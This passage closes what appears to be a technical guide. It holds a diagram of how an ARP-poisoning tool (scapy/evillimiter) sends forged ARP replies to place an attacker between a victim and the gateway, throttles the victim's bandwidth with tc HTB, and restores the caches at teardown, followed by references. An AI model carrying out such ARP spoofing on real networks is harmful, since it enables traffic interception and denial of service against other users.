Userspace:
+--------------------------------------------------------------------------+
|  ARP Poison thread (scapy / evillimiter):                                |
|    --> ARP reply every 2s to victim:  gateway IP = attacker MAC          |
|    --> ARP reply every 2s to gateway: victim IP  = attacker MAC          |
+--------------------------------------------------------------------------+

Result:
  Victim (192.168.1.50) believes gateway is at attacker MAC
  Gateway believes victim is at attacker MAC
  All victim <-> internet traffic flows through attacker's NIC
  tc HTB limits victim bandwidth in both upload and download directions
  On teardown: ARP caches restored, tc qdiscs removed, nft mangle cleared
==============================================================================
```

---

*References: ArchWiki Advanced Traffic Control, NixOS Wiki Networking, nftables Wiki Rate Limiting, Gentoo Wiki Traffic Shaping, Masrkai/Evillimiter GitHub (<https://github.com/Masrkai/Evillimiter>), bitbrute/evillimiter GitHub, nftables.org documentation*
